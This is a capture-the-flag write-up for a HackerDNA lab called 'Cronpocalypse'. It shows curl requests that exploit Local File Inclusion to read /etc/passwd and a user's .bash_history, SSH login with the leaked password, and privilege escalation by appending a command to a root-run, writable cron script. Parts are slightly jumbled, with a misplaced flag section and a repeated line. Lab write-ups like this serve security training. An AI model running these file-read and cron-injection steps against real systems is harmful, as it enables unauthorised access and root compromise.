![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Platform](https://img.shields.io/badge/Platform-HackerDNA-blue)
![Cronpocalypse](https://img.shields.io/badge/Cronpocalypse-LFI%20%2B%20Cron%20Escalation-darkred?style=flat&logo=linux&logoColor=white)

# Cronpocalypse

## Objective
Identify a Local File Inclusion vulnerability, extract credentials from the system, gain SSH access, and escalate to root by abusing a misconfigured cron job.

## Steps

### 1. Start the machine
Launch the lab in HackerDNA and open the provided IP in your browser.  
You’ll see a fake “FakeCorp” webpage with an **Explore Features** button.

### 2. Discover the LFI vulnerability
Under **Read Files**, the application sends requests like:


## Flag  
User flag: Retrieved from `/home/ctf/flag-user.txt`  
Root flag: Retrieved from `/home/ctf/root-flag.txt`  

http://<IP>/read?file=flag.txt

Changing the `file=` parameter reveals a Local File Inclusion vulnerability.

### 3. Enumerate the filesystem
Use curl to read system files:

curl http://<IP>/read?file=/etc/passwd

This confirms the presence of a `ctf` user.

### 4. Read the ctf user’s .bash_history
The same LFI lets you read the user’s command history:

curl http://<IP>/read?file=/home/ctf/.bash_history

This confirms the presence of a `ctf` user.
The history reveals a password change:
ctf:S***********d!

### 5. SSH into the machine
Use the credentials found in `.bash_history`:
ssh ctf@<IP>

After logging in, retrieve the user flag:
cat flag-user.txt

### 6. Enumerate cron jobs for privilege escalation
Check system cron directories:

ls -la /etc/cron.*

A writable script is located in `/etc/cron.hourly/`.  
This script is executed by **root**, but the `ctf` user has write permissions — the core vulnerability of this lab.

### 7. Inject a payload into the cron script
Append a command to copy the root flag into a readable location:

echo "cp /root/flag.txt /home/ctf/root-flag.txt" >> /etc/cron.hourly/backup.sh

### 8. Wait for cron to run
Cron executes the script automatically (runs as root).  
After a minute, check your home directory:

ls -la /home/ctf

You should now see:
root-flag.txt

### 9. Read the root flag

cat /home/ctf/root-flag.txt

## Flag
User flag: Retrieved from `/home/ctf/flag-user.txt`  
Root flag: Retrieved from `/home/ctf/root-flag.txt`





